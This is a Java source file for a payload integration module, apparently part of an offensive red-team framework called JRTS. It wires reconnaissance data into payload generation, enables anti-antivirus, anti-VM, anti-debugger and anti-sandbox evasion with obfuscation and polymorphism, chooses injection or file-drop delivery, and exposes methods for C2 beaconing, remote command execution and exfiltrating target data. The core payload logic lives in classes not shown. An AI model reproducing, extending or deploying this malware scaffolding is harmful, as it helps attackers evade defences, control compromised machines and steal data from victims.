package com.jabber.jrts.modules.payload;

import java.util.*;

/**
 * PayloadIntegrationModule - Integrates payload creation with other JRTS components
 * Coordinates with reconnaissance, C2, and delivery systems
 */
public class PayloadIntegrationModule {
    
    private final PayloadManager payloadManager;
    private final PayloadCommandModule commandModule;
    private final Map<String, Object> integrationContext = new HashMap<>();
    private final List<PayloadDeliveryCallback> deliveryCallbacks = new ArrayList<>();
    private final Map<String, ReconnaissanceData> reconData = new HashMap<>();

    public PayloadIntegrationModule() {
        this.payloadManager = new PayloadManager();
        this.commandModule = new PayloadCommandModule();
    }

    /**
     * Create payload using reconnaissance data
     */
    public String createPayloadFromRecon(String targetId, ReconnaissanceData recon) {
        try {
            // Register reconnaissance data
            reconData.put(targetId, recon);

            // Create base payload
            String basePayload = generatePayloadForTarget(recon);

            // Configure payload based on target environment
            PayloadManager.PayloadConfig config = configurePayloadForEnvironment(recon);

            // Create advanced payload
            String advancedPayload = payloadManager.createAdvancedPayload(basePayload, config);

            // Trigger delivery callbacks
            notifyDeliveryCallbacks(targetId, advancedPayload);

            return advancedPayload;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Generate base payload tailored to target
     */
    private String generatePayloadForTarget(ReconnaissanceData recon) {
        StringBuilder payload = new StringBuilder();
        payload.append("// JRTS Payload for ").append(recon.getTargetName()).append("\n");
        payload.append("// OS: ").append(recon.getOperatingSystem()).append("\n");
        payload.append("// Architecture: ").append(recon.getArchitecture()).append("\n");
        payload.append("\npublic class Payload {\n");
        payload.append("  public static void main(String[] args) {\n");
        payload.append("    System.out.println(\"Payload executing on \"+System.getProperty(\"os.name\"));\n");
        payload.append("  }\n");
        payload.append("}\n");
        return payload.toString();
    }

    /**
     * Configure payload based on target environment
     */
    private PayloadManager.PayloadConfig configurePayloadForEnvironment(ReconnaissanceData recon) {
        PayloadManager.PayloadConfig config = new PayloadManager.PayloadConfig();

        // Enable/disable features based on detected defenses
        if (recon.hasAntiVirus()) {
            config.setAntiAV(true);
            config.setObfuscationEnabled(true);
        }

        if (recon.hasVirtualMachine()) {
            config.setAntiVM(true);
        }

        if (recon.isDebuggerPresent()) {
            config.setAntiDebug(true);
        }

        if (recon.hasSandbox()) {
            config.setAntiSandbox(true);
            config.setPolymorphismEnabled(true);
        }

        // Set deployment method based on target environment
        if (recon.supportsDirectInjection()) {
            config.setDeploymentMethod(PayloadManager.PayloadConfig.DeploymentMethod.DIRECT_INJECTION);
        } else if (recon.supportsNetworkDelivery()) {
            config.setDeploymentMethod(PayloadManager.PayloadConfig.DeploymentMethod.NETWORK_DELIVERY);
        } else {
            config.setDeploymentMethod(PayloadManager.PayloadConfig.DeploymentMethod.FILE_DROP);
        }

        return config;
    }

    /**
     * Configure C2 communication for payload
     */
    public void configurePayloadC2(String payloadId, String c2Server, int c2Port,
                                  PayloadCommandModule.C2Protocol protocol) {
        commandModule.configureC2(c2Server, c2Port, protocol, 300000);
        integrationContext.put("c2_server_" + payloadId, c2Server);
        integrationContext.put("c2_port_" + payloadId, c2Port);
    }

    /**
     * Register delivery callback
     */
    public void registerDeliveryCallback(PayloadDeliveryCallback callback) {
        deliveryCallbacks.add(callback);
    }

    /**
     * Notify delivery callbacks
     */
    private void notifyDeliveryCallbacks(String targetId, String payload) {
        for (PayloadDeliveryCallback callback : deliveryCallbacks) {
            callback.onPayloadCreated(targetId, payload);
        }
    }

    /**
     * Start C2 beacon for payload
     */
    public void startC2BeaconForPayload(String payloadId) {
        commandModule.startC2Beacon();
        integrationContext.put("beacon_active_" + payloadId, true);
    }

    /**
     * Execute command through payload
     */
    public PayloadCommandModule.CommandResult executeCommandThroughPayload(
        String payloadId, String command, PayloadCommandModule.CommandType type) {
        return commandModule.executeCommand(command, type);
    }

    /**
     * Exfiltrate data from target
     */
    public boolean exfiltrateDataFromTarget(String targetId, String data) {
        boolean result = commandModule.exfiltrateData(data);
        if (result) {
            integrationContext.put("exfil_count_" + targetId, 
                (Integer) integrationContext.getOrDefault("exfil_count_" + targetId, 0) + 1);
        }
        return result;
    }

    /**
     * Get integrated payload statistics
     */
    public String getIntegrationStats() {
        StringBuilder stats = new StringBuilder();
        stats.append("=== Payload Integration Statistics ===\n");
        stats.append(payloadManager.getPayloadStats());
        stats.append(commandModule.getCommandStats()).append("\n");
        stats.append("Registered Targets: ").append(reconData.size()).append("\n");
        stats.append("Active Delivery Callbacks: ").append(deliveryCallbacks.size()).append("\n");
        stats.append("Integration Context Size: ").append(integrationContext.size()).append("\n");
        return stats.toString();
    }

    /**
     * Get reconnaissance data for target
     */
    public ReconnaissanceData getReconDataForTarget(String targetId) {
        return reconData.get(targetId);
    }

    /**
     * List all integrated targets
     */
    public Set<String> listIntegratedTargets() {
        return new HashSet<>(reconData.keySet());
    }

    /**
     * Clean up integration data
     */
    public void cleanup() {
        payloadManager.clearRegistry();
        integrationContext.clear();
        reconData.clear();
        deliveryCallbacks.clear();
    }

    /**
     * Payload delivery callback interface
     */
    @FunctionalInterface
    public interface PayloadDeliveryCallback {
        void onPayloadCreated(String targetId, String payload);
    }

    /**
     * Reconnaissance data class - represents target information from reconnaissance module
     */
    public static class ReconnaissanceData {
        private String targetName;
        private String targetIp;
        private String operatingSystem;
        private String architecture;
        private boolean hasAntiVirus;
        private boolean hasVirtualMachine;
        private boolean isDebuggerPresent;
        private boolean hasSandbox;
        private boolean supportsDirectInjection;
        private boolean supportsNetworkDelivery;
        private Map<String, String> additionalInfo = new HashMap<>();

        // Constructor
        public ReconnaissanceData(String targetName, String targetIp) {
            this.targetName = targetName;
            this.targetIp = targetIp;
        }

        // Getters and Setters
        public String getTargetName() { return targetName; }
        public void setTargetName(String name) { this.targetName = name; }

        public String getTargetIp() { return targetIp; }
        public void setTargetIp(String ip) { this.targetIp = ip; }

        public String getOperatingSystem() { return operatingSystem; }
        public void setOperatingSystem(String os) { this.operatingSystem = os; }

        public String getArchitecture() { return architecture; }
        public void setArchitecture(String arch) { this.architecture = arch; }

        public boolean hasAntiVirus() { return hasAntiVirus; }
        public void setHasAntiVirus(boolean has) { this.hasAntiVirus = has; }

        public boolean hasVirtualMachine() { return hasVirtualMachine; }
        public void setHasVirtualMachine(boolean has) { this.hasVirtualMachine = has; }

        public boolean isDebuggerPresent() { return isDebuggerPresent; }
        public void setIsDebuggerPresent(boolean present) { this.isDebuggerPresent = present; }

        public boolean hasSandbox() { return hasSandbox; }
        public void setHasSandbox(boolean has) { this.hasSandbox = has; }

        public boolean supportsDirectInjection() { return supportsDirectInjection; }
        public void setSupportsDirectInjection(boolean supports) { this.supportsDirectInjection = supports; }

        public boolean supportsNetworkDelivery() { return supportsNetworkDelivery; }
        public void setSupportsNetworkDelivery(boolean supports) { this.supportsNetworkDelivery = supports; }

        public Map<String, String> getAdditionalInfo() { return additionalInfo; }
        public void addAdditionalInfo(String key, String value) { 
            additionalInfo.put(key, value); 
        }

        public String getInfo() {
            return String.format("Target: %s (%s) - OS: %s, Arch: %s", 
                targetName, targetIp, operatingSystem, architecture);
        }
    }
}
